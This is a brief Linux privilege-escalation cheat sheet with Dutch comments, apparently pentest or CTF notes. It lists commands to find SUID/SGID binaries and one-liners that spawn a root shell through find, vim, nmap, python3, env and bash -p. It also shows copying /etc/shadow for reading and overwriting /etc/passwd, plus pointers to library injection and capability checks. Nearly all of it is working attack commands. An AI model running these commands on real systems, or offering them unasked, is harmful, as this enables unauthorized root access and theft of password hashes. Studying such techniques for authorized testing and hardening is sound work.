# Linux SUID/SGID Privilege Escalation
# SUID bestanden vinden:
find / -perm -4000 -type f 2>/dev/null
# SGID bestanden vinden:
find / -perm -2000 -type f 2>/dev/null
# Beide:
find / -perm /6000 -type f 2>/dev/null
# Bekende exploiteerbare SUID binaries (check GTFOBins):
# /usr/bin/find: find . -exec /bin/sh -p \;
# /usr/bin/vim: vim -c ':!/bin/sh'
# /usr/bin/nmap (old): nmap --interactive -> !sh
# /usr/bin/python3: python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# /usr/bin/env: env /bin/sh -p
# /usr/bin/bash: bash -p
# /usr/bin/cp: cp /etc/shadow /tmp/ (lezen), cp custom_passwd /etc/passwd (schrijven)
# Custom SUID binary exploitatie (shared library injection):
# 1. Check linked libraries: ldd /path/to/suid_binary
# 2. Zoek ontbrekende libraries of writable library paden
# Tip: -p flag bij bash/sh behoudt SUID privileges
# Tip: GTFOBins referentie: https://gtfobins.github.io/#+suid
# Tip: Capabilities kunnen ook privesc opleveren: getcap -r / 2>/dev/null
